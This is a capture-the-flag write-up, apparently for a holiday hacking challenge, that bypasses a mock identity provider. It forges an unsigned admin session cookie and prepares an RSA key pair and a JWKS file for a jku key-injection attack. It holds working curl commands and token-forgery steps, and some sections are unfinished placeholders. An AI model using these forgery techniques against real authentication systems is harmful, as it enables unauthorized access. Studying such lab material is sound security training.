Rogue Gnome Identity Provider
Difficulty: 2/5

Objective:
Hike over to Paul in the park for a gnomey authentication puzzle adventure. What malicious firmware image are the gnomes downloading?


Task: 

<img width="813" height="512" alt="image" src="https://github.com/user-attachments/assets/37f1e8fe-7a92-4897-9ecb-2034fc17d3bc" />

```
Hi, Paul here. Welcome to my web-server. I've been using it for JWT analysis.

I've discovered the Gnomes have a diagnostic interface that authenticates to an Atnas identity provider.

Unfortunately the gnome:SittingOnAShelf credentials discovered in 2015 don't have sufficient access to view the gnome diagnostic interface.

I've kept some notes in ~/notes

Can you help me gain access to the Gnome diagnostic interface and discover the name of the file the Gnome downloaded? When you identify the filename, enter it in the badge.
```

```
paul@paulweb:~$ cat notes
# Sites

## Captured Gnome:
curl http://gnome-48371.atnascorp/

## ATNAS Identity Provider (IdP):
curl http://idp.atnascorp/

## My CyberChef website:
curl http://paulweb.neighborhood/
### My CyberChef site html files:
~/www/


# Credentials

## Gnome credentials (found on a post-it):
Gnome:SittingOnAShelf


# Curl Commands Used in Analysis of Gnome:

## Gnome Diagnostic Interface authentication required page:
curl http://gnome-48371.atnascorp

## Request IDP Login Page
curl http://idp.atnascorp/?return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth

## Authenticate to IDP
curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login

## Pass Auth Token to Gnome
curl -v http://gnome-48371.atnascorp/auth?token=<insert-JWT>

## Access Gnome Diagnostic Interface
curl -H 'Cookie: session=<insert-session>' http://gnome-48371.atnascorp/diagnostic-interface

## Analyze the JWT
jwt_tool.py <insert-JWT>
```

```
paul@paulweb:~$ curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzA2Mzg0OCwiZXhwIjoxNzYzMDcxMDQ4LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.4pWaWS2tTNnT_xZK1RpCPW4Ia4aN1DqOoLJoeCWFmAGQuRR_YwovNMtXYNRZsau8fgkSA32J4gk2pzwIEzFZS-k3LvpLnasNKVC_eA-4CRkfoGfK2Rsph-yW6PB-gFMMCSCsf1FAX3nLUjH_2_zsUX7PPNldInxQi19pAD91-tg3bTPy7gBpOKh9HHj4kzqPVq3JLJ7MlpMeXvyZmIAku0jREnk-Uj4k5Usmh2-RQ1Lrjh1uKDdKerwlrEid1izDwaSzPWMYPiGIeCJxmijFZiDWnQnRa_5m1TlU-n8sd8RbnQhG5ZETNSUjZbWOUVjFqJgMFILn8r4acFkb3vfzDA">http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzA2Mzg0OCwiZXhwIjoxNzYzMDcxMDQ4LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.4pWaWS2tTNnT_xZK1RpCPW4Ia4aN1DqOoLJoeCWFmAGQuRR_YwovNMtXYNRZsau8fgkSA32J4gk2pzwIEzFZS-k3LvpLnasNKVC_eA-4CRkfoGfK2Rsph-yW6PB-gFMMCSCsf1FAX3nLUjH_2_zsUX7PPNldInxQi19pAD91-tg3bTPy7gBpOKh9HHj4kzqPVq3JLJ7MlpMeXvyZmIAku0jREnk-Uj4k5Usmh2-RQ1Lrjh1uKDdKerwlrEid1izDwaSzPWMYPiGIeCJxmijFZiDWnQnRa_5m1TlU-n8sd8RbnQhG5ZETNSUjZbWOUVjFqJgMFILn8r4acFkb3vfzDA</a>. If not, click the link.
```

Extracted Token == `eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzA2Mzg0OCwiZXhwIjoxNzYzMDcxMDQ4LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.4pWaWS2tTNnT_xZK1RpCPW4Ia4aN1DqOoLJoeCWFmAGQuRR_YwovNMtXYNRZsau8fgkSA32J4gk2pzwIEzFZS-k3LvpLnasNKVC_eA-4CRkfoGfK2Rsph-yW6PB-gFMMCSCsf1FAX3nLUjH_2_zsUX7PPNldInxQi19pAD91-tg3bTPy7gBpOKh9HHj4kzqPVq3JLJ7MlpMeXvyZmIAku0jREnk-Uj4k5Usmh2-RQ1Lrjh1uKDdKerwlrEid1izDwaSzPWMYPiGIeCJxmijFZiDWnQnRa_5m1TlU-n8sd8RbnQhG5ZETNSUjZbWOUVjFqJgMFILn8r4acFkb3vfzDA
`

Send the JWT to Gnome App

```
paul@paulweb:~$ curl -v "http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzA2Mzg0OCwiZXhwIjoxNzYzMDcxMDQ4LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.4pWaWS2tTNnT_xZK1RpCPW4Ia4aN1DqOoLJoeCWFmAGQuRR_YwovNMtXYNRZsau8fgkSA32J4gk2pzwIEzFZS-k3LvpLnasNKVC_eA-4CRkfoGfK2Rsph-yW6PB-gFMMCSCsf1FAX3nLUjH_2_zsUX7PPNldInxQi19pAD91-tg3bTPy7gBpOKh9HHj4kzqPVq3JLJ7MlpMeXvyZmIAku0jREnk-Uj4k5Usmh2-RQ1Lrjh1uKDdKerwlrEid1izDwaSzPWMYPiGIeCJxmijFZiDWnQnRa_5m1TlU-n8sd8RbnQhG5ZETNSUjZbWOUVjFqJgMFILn8r4acFkb3vfzDA"
* Host gnome-48371.atnascorp:80 was resolved.
* IPv6: (none)
* IPv4: 127.0.0.1
*   Trying 127.0.0.1:80...
* Connected to gnome-48371.atnascorp (127.0.0.1) port 80
> GET /auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzA2Mzg0OCwiZXhwIjoxNzYzMDcxMDQ4LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.4pWaWS2tTNnT_xZK1RpCPW4Ia4aN1DqOoLJoeCWFmAGQuRR_YwovNMtXYNRZsau8fgkSA32J4gk2pzwIEzFZS-k3LvpLnasNKVC_eA-4CRkfoGfK2Rsph-yW6PB-gFMMCSCsf1FAX3nLUjH_2_zsUX7PPNldInxQi19pAD91-tg3bTPy7gBpOKh9HHj4kzqPVq3JLJ7MlpMeXvyZmIAku0jREnk-Uj4k5Usmh2-RQ1Lrjh1uKDdKerwlrEid1izDwaSzPWMYPiGIeCJxmijFZiDWnQnRa_5m1TlU-n8sd8RbnQhG5ZETNSUjZbWOUVjFqJgMFILn8r4acFkb3vfzDA HTTP/1.1
> Host: gnome-48371.atnascorp
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 302 FOUND
< Date: Thu, 13 Nov 2025 19:58:40 GMT
< Server: Werkzeug/3.0.1 Python/3.12.3
< Content-Type: text/html; charset=utf-8
< Content-Length: 229
< Location: /diagnostic-interface
< Vary: Cookie
< Set-Cookie: session=eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ25vbWUifQ.aRY4cA.Bwpsp7Wrc7KomTDDtc3G-TUL9t0; HttpOnly; Path=/
< 
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/diagnostic-interface">/diagnostic-interface</a>. If not, click the link.
* Connection #0 to host gnome-48371.atnascorp left intact
```

Use Session Cookie to Access Diagnostic Interface

```
paul@paulweb:~$ curl -H "Cookie: session=eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ25vbWUifQ.aRY4cA.Bwpsp7Wrc7KomTDDtc3G-TUL9t0" http://gnome-48371.atnascorp/diagnostic-interface

<!DOCTYPE html>
<html>
<head>
    <title>AtnasCorp : Gnome Diagnostic Interface</title>
    <link rel="stylesheet" type="text/css" href="/static/styles/styles.css">
</head>
<body>
<h1>AtnasCorp : Gnome Diagnostic Interface</h1>
<p>Welcome gnome</p><p>Diagnostic access is only available to admins.</p>

</body>
```

eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ25vbWUifQ.aRY4cA.Bwpsp7Wrc7KomTDDtc3G-TUL9t0

JWT- structure
<base64-header-and-payload>.<signature>

decoding payload: 
```
{
  "admin": false,
  "username": "gnome"
}
```

Forge a New Session Token with "admin": true 

```
Powershell

$bytes = [System.Text.Encoding]::UTF8.GetBytes('{"admin":true,"username":"gnome"}')
PS C:\Users\Nick> [Convert]::ToBase64String($bytes)
eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9
```

Set the full session cookie to:

```
eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9..
```

Note the two dots .. to mimic a JWT with no signature.

Method 2: 

Generate RSA key pair

```
paul@paulweb:~$ openssl genrsa -out private.key 2048
openssl rsa -in private.key -pubout -out public.pem
writing RSA key
```

https://mkjwk.org/
<img width="1704" height="772" alt="image" src="https://github.com/user-attachments/assets/8662e56b-902a-4b93-9ee4-de7746be477e" />


Save the output to a file `nano jwks.json`
```
{
    "keys": [
        {
            "p": "7SEAGMEts4Jkz6sHeIk5uJ93edZarFoeQFosP0jslc7dAU32wuwr9VO7EJqOGm5Qk59sYfPWS_pYNL1Z-uUvtw2JDr2akTb4oNxLbr95Biwml-72qGYusmU7dPkSvSCIEOA5ATL_fUXgwOVvlbAIG2MyxlAWgpICKa0lR7TIJas",
            "kty": "RSA",
            "q": "itRL7ooyGXYnxLOC9oVcUuI3Csqr8hb9mC8GyFlkZrmSxAjLm9XIgBtTBrZqtxBgh7bfYXEbRuaM9OEzNJ4ICL9jLigITNRODAVE6WV8s5d45l_UwxnyJ7GczrmP50UNr8ptQFPVjM6nqRCyn86VLpZXIXyXPyy_Vihehxf6iTE",
            "d": "YZhPILMlL_D3WBBddaN7NFd_mzvFQoaHqNrp8QH33aBk16oV6k49XdrlzzrR2d64N_ZC0-Eijea6NzHiCFK6EOIo-xMLfCcbfO8W_8u06W8yq_ULo6W9si5ong0cM38B6mJP9DtJRPvGWA4kxBf0E8mQj3ROq2OB6IbhiqFPzWZg7UHAagHbuitxcr1plBQK9g5kqKW3OkXQKpD5Co5SalKeDQm5OLTBENZ9vcSltkL0M0ug3fcVEjp2srMuBRd9cVRlFsxE67W9T2IDneNYv_ZVIvO20e_2-oW-uhtVZYPIFDsyS9nRqypGTkQCsGytghS0uU8r6SsAJDW6nHuawQ",
            "e": "AQAB",
            "use": "sig",
            "kid": "fzvDNC3lBrXPFU90tYiI-GSqMYP3qNw9ooigHOtczXE",
            "qi": "2QUUGjWJlnOIcYJ-wh5tf7uDOvW8IfIfoIguMY9oo9Uah7e_33Ttl_M0cxkMjFDWMuTNr7Zfq8MJXwcSGZRIiJEaioct9E4bLqb6WIo1Vbt1Xa63Qid89g4xTp_AAeaaz4eFKn7xCkt3vnw38i8obex1lGK3ecKTYir0bqQtKCU",
            "dp": "lB69-biJfIzhvdp-cyt8k7eAoOllgC1WoinxY6KArd8mq87wabeuibLAsdFpHFd2G5BE2ja-0HzTJjZ1A0Sv9m8NAtkquLSWv5x7vfT6ewGPJe6Nwoj5eFPFvP5sVxkABVKaKQabErxYdQWcGut3VOw05i1Wsj7T_QZ7t_vT3bs",
            "alg": "RS256",
            "dq": "UNpDPrGNa_a8QnqpkxkoI71LgSV37o4lMzRwJs6pAoqhRzo4GpHvK2y-dfJXRDZtgZynjABremdbQGLHh6Vh2HZeNMtryhL7QVTwRV2tuopFByZYqye5OBTg1iSMAozc47xo1EX-4PqZ-oSXAys1BuTX6dC95TUSWgM4ykTUzIE",
            "n": "gJhvtwxaJk32bpN1T0yPdJfAxKGzIvzu8JUnKwSV1iVrvzmaTEIgZ-NHNtGHRrZGdyzn_sj9zWwToVEcveLMT-cZJ4oGJtJNqF7jomviVrd60AoA7hXZxJV7f69EE7LSw-pahHVhFWLJmHyU3KTeXk0KqNM41M66xf9p4YYnIYYTqZarDJfHGn6JYvi5h_B-K9j2s5Z3PhEE1SyqiIGUL8UZaGGeZaDhjIjcDi_WNtVQHYtpWeM_-lQ_zwuuZaarTzkAf5GH6h9owFTe_pbJtLZxuZP5wCvEqOYgY4l4jy21rDh-kJoK1jPogfU1cgLpD6v45djNU9ukdLB83HW4uw"
        }
    ]
}
```

Host the JWKS file

XXXX

Method 3:

```
mkdir -p ~/www/.well-known
paul@paulweb:~$ nano ~/www/.well-known/jwks.json
```

```
{
    "kty": "RSA",
    "e": "AQAB",
    "use": "sig",
    "kid": "fzvDNC3lBrXPFU90tYiI-GSqMYP3qNw9ooigHOtczXE",
    "alg": "RS256",
    "n": "gJhvtwxaJk32bpN1T0yPdJfAxKGzIvzu8JUnKwSV1iVrvzmaTEIgZ-NHNtGHRrZGdyzn_sj9zWwToVEcveLMT-cZJ4oGJtJNqF7jomviVrd60AoA7hXZxJV7f69EE7LSw-pahHVhFWLJmHyU3KTeXk0KqNM41M66xf9p4YYnIYYTqZarDJfHGn6JYvi5h_B-K9j2s5Z3PhEE1SyqiIGUL8UZaGGeZaDhjIjcDi_WNtVQHYtpWeM_-lQ_zwuuZaarTzkAf5GH6h9owFTe_pbJtLZxuZP5wCvEqOYgY4l4jy21rDh-kJoK1jPogfU1cgLpD6v45djNU9ukdLB83HW4uw"
}
```




